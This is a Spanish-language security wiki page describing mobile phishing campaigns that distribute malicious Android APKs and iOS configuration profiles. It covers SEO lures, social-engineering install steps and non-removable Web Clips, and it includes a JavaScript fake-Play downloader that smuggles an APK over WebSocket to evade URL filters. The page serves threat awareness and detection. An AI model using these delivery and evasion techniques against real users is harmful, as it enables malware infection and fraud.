# Phishing móvil y distribución de apps maliciosas (Android e iOS)

> [!INFO]
> Esta página cubre técnicas utilizadas por threat actors para distribuir **APK maliciosos de Android** y **perfiles de configuración móvil de iOS** mediante phishing (SEO, ingeniería social, tiendas falsas, apps de citas, etc.).
> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.<sup>[[1]](#references)</sup>

## Flujo de ataque

1. **Infraestructura de SEO/Phishing**
* Registrar docenas de dominios similares (citas, intercambio en la nube, servicio de automóviles…).
– Usar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionarse en Google.
– Alojar instrucciones de instalación tanto de Android (`.apk`) como de iOS en la misma landing page.
2. **Descarga de la primera etapa**
* Android: enlace directo a un APK *sin firmar* o de una “tienda de terceros”.
* iOS: enlace `itms-services://` o HTTPS simple a un perfil **mobileconfig** malicioso (véase abajo).
3. **Comportamiento posterior a la instalación en Android**
* La ejecución controlada por C2, el abuso de permisos, los bypasses de droppers, la recopilación en segundo plano y otros comportamientos de malware posteriores a la instalación se tratan en la página dedicada a Android Malware Post-Exploitation que aparece abajo.
4. **Técnica de entrega en iOS**
* Un único **perfil de configuración móvil** puede solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., para inscribir el dispositivo en una supervisión similar a “MDM”.
* Instrucciones de ingeniería social:
1. Abrir Ajustes ➜ *Perfil descargado*.
2. Pulsar *Instalar* tres veces (capturas de pantalla en la página de phishing).
3. Confiar en el perfil sin firmar ➜ el atacante obtiene permisos de *Contactos* y *Fotos* sin la revisión de App Store.
5. **Payload de Web Clip de iOS (icono de app de phishing)**
* Los payloads `com.apple.webClip.managed` pueden **fijar una URL de phishing en la pantalla de inicio** con un icono/etiqueta de marca.
* Los Web Clips pueden ejecutarse en **pantalla completa** (ocultando la interfaz del navegador) y marcarse como **no eliminables**, obligando a la víctima a borrar el perfil para eliminar el icono.<sup>[[3]](#references)</sup>
6. **Capa de red**
* HTTP simple, normalmente en el puerto 80 con un encabezado HOST como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sin TLS → fácil de detectar).

## Android Malware Post-Exploitation

Para conocer el tradecraft de malware de Android posterior a la instalación, como C2, abuso de Accessibility, overlays, automatización ATS, carga de DEX por etapas, SMS premium y persistencia, consulta:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling basado en Socket.IO/WebSocket + páginas falsas de Google Play

Los atacantes sustituyen cada vez más los enlaces estáticos a APK por un canal Socket.IO/WebSocket integrado en señuelos con apariencia de Google Play. Esto oculta la URL del payload, evita los filtros de URL/extensión y mantiene una UX de instalación realista.<sup>[[2]](#references)[[4]](#references)</sup>

Flujo típico del cliente observado en la práctica:

<details>
<summary>Descargador falso de Play basado en Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por qué evade los controles simples:
- No se expone ninguna URL estática de APK; el payload se reconstruye en memoria a partir de frames de WebSocket.
- Los filtros de URL/MIME/extensión que bloquean respuestas .apk directas pueden no detectar datos binarios tunelizados mediante WebSockets/Socket.IO.
- Los crawlers y sandboxes de URL que no ejecutan WebSockets no recuperarán el payload.

Consulta también el tradecraft y las herramientas de WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [El lado oscuro del romance: campaña de extorsión SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Configuración del payload Web Clips para dispositivos Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Troyano bancario dirigido a usuarios de Android de Indonesia y Vietnam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
